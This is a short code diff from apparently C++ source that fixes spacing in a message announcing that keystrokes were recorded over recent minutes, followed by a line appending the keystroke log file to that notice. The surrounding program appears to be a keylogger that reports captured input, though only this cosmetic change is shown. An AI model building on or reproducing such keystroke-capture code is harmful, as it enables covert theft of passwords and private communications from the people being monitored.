@@ -377,7 +377,7 @@ void sendNotice(){
 
         std::wstringstream noticeStream;
 
-        noticeStream << "The following keystrokes have been recorded in the last" << NOTICE_DELAY/60 << "minutes:\n";
+        noticeStream << "The following keystrokes have been recorded in the last " << NOTICE_DELAY/60 << " minutes:\n";
         noticeStream << logFile.rdbuf();
 
         logFileMutex.unlock();
